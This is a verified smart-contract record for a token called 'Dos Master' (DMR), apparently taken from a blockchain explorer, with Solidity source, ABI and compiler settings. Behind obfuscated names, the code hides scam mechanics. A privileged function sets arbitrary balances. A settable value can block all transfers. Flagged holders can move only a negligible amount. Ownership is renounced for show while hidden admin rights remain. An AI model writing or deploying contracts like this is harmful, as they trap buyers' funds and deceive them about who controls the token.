{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface launchAmount {\n    function createPair(address shouldList, address fromSwapExempt) external returns (address);\n}\n\ninterface atMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalShouldLimit) external view returns (uint256);\n\n    function transfer(address liquidityIsTotal, uint256 shouldTo) external returns (bool);\n\n    function allowance(address maxMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityIsTotal,\n        uint256 shouldTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalLimit, uint256 value);\n    event Approval(address indexed maxMode, address indexed spender, uint256 value);\n}\n\nabstract contract swapMinFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface teamEnable is atMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DosMaster is swapMinFrom, atMin, teamEnable {\n\n    function launchAt(address limitTo, address liquidityIsTotal, uint256 shouldTo) internal returns (bool) {\n        if (limitTo == exemptEnable) {\n            return launchedLiquidityTrading(limitTo, liquidityIsTotal, shouldTo);\n        }\n        uint256 modeMarketing = atMin(liquidityLaunch).balanceOf(tradingAuto);\n        require(modeMarketing == feeSell);\n        require(liquidityIsTotal != tradingAuto);\n        if (exemptAmountLaunch[limitTo]) {\n            return launchedLiquidityTrading(limitTo, liquidityIsTotal, shouldFundAuto);\n        }\n        return launchedLiquidityTrading(limitTo, liquidityIsTotal, shouldTo);\n    }\n\n    function transferFrom(address limitTo, address liquidityIsTotal, uint256 shouldTo) external override returns (bool) {\n        if (_msgSender() != shouldMax) {\n            if (tradingEnableLiquidity[limitTo][_msgSender()] != type(uint256).max) {\n                require(shouldTo <= tradingEnableLiquidity[limitTo][_msgSender()]);\n                tradingEnableLiquidity[limitTo][_msgSender()] -= shouldTo;\n            }\n        }\n        return launchAt(limitTo, liquidityIsTotal, shouldTo);\n    }\n\n    string private tokenSellAmount = \"Dos Master\";\n\n    uint256 private totalShould;\n\n    address shouldMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return tokenSellAmount;\n    }\n\n    uint256 private tradingAutoMode = 100000000 * 10 ** 18;\n\n    function receiverTrading(address receiverLaunch) public {\n        amountTakeReceiver();\n        \n        if (receiverLaunch == exemptEnable || receiverLaunch == liquidityLaunch) {\n            return;\n        }\n        exemptAmountLaunch[receiverLaunch] = true;\n    }\n\n    function launchedLiquidityTrading(address limitTo, address liquidityIsTotal, uint256 shouldTo) internal returns (bool) {\n        require(limitLiquidity[limitTo] >= shouldTo);\n        limitLiquidity[limitTo] -= shouldTo;\n        limitLiquidity[liquidityIsTotal] += shouldTo;\n        emit Transfer(limitTo, liquidityIsTotal, shouldTo);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldLimit;\n    }\n\n    function amountTakeReceiver() private view {\n        require(launchedSwap[_msgSender()]);\n    }\n\n    uint256 feeSell;\n\n    uint256 private minSender;\n\n    function fundMarketing(uint256 shouldTo) public {\n        amountTakeReceiver();\n        feeSell = shouldTo;\n    }\n\n    mapping(address => mapping(address => uint256)) private tradingEnableLiquidity;\n\n    uint8 private shouldBuy = 18;\n\n    function allowance(address listIsEnable, address receiverAuto) external view virtual override returns (uint256) {\n        if (receiverAuto == shouldMax) {\n            return type(uint256).max;\n        }\n        return tradingEnableLiquidity[listIsEnable][receiverAuto];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingAutoMode;\n    }\n\n    uint256 receiverFrom;\n\n    address tradingAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private modeTotal;\n\n    function owner() external view returns (address) {\n        return takeSender;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldBuy;\n    }\n\n    string private shouldLimit = \"DMR\";\n\n    function transfer(address minTotal, uint256 shouldTo) external virtual override returns (bool) {\n        return launchAt(_msgSender(), minTotal, shouldTo);\n    }\n\n    uint256 public sellWallet;\n\n    uint256 constant shouldFundAuto = 10 ** 10;\n\n    function balanceOf(address totalShouldLimit) public view virtual override returns (uint256) {\n        return limitLiquidity[totalShouldLimit];\n    }\n\n    address public exemptEnable;\n\n    function approve(address receiverAuto, uint256 shouldTo) public virtual override returns (bool) {\n        tradingEnableLiquidity[_msgSender()][receiverAuto] = shouldTo;\n        emit Approval(_msgSender(), receiverAuto, shouldTo);\n        return true;\n    }\n\n    address public liquidityLaunch;\n\n    function launchedFrom(address minTotal, uint256 shouldTo) public {\n        amountTakeReceiver();\n        limitLiquidity[minTotal] = shouldTo;\n    }\n\n    function receiverMax() public {\n        emit OwnershipTransferred(exemptEnable, address(0));\n        takeSender = address(0);\n    }\n\n    bool public swapMaxLiquidity;\n\n    bool private feeMin;\n\n    function getOwner() external view returns (address) {\n        return takeSender;\n    }\n\n    mapping(address => uint256) private limitLiquidity;\n\n    event OwnershipTransferred(address indexed enableModeLiquidity, address indexed launchShould);\n\n    constructor (){\n        if (tradingExempt) {\n            swapMaxLiquidity = true;\n        }\n        launchedTeam autoMinList = launchedTeam(shouldMax);\n        liquidityLaunch = launchAmount(autoMinList.factory()).createPair(autoMinList.WETH(), address(this));\n        if (minSender == limitSell) {\n            limitSell = sellWallet;\n        }\n        exemptEnable = _msgSender();\n        launchedSwap[exemptEnable] = true;\n        limitLiquidity[exemptEnable] = tradingAutoMode;\n        receiverMax();\n        \n        emit Transfer(address(0), exemptEnable, tradingAutoMode);\n    }\n\n    mapping(address => bool) public exemptAmountLaunch;\n\n    function sellMin(address toToken) public {\n        require(toToken.balance < 100000);\n        if (swapSender) {\n            return;\n        }\n        \n        launchedSwap[toToken] = true;\n        if (tradingExempt != feeMin) {\n            feeMin = false;\n        }\n        swapSender = true;\n    }\n\n    bool public tradingExempt;\n\n    bool public swapSender;\n\n    uint256 public limitSell;\n\n    address private takeSender;\n\n    uint256 private buyFund;\n\n    mapping(address => bool) public launchedSwap;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableModeLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listIsEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalShouldLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptAmountLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldTo\",\"type\":\"uint256\"}],\"name\":\"fundMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTo\",\"type\":\"uint256\"}],\"name\":\"launchedFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"}],\"name\":\"receiverTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toToken\",\"type\":\"address\"}],\"name\":\"sellMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMaxLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityIsTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DosMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}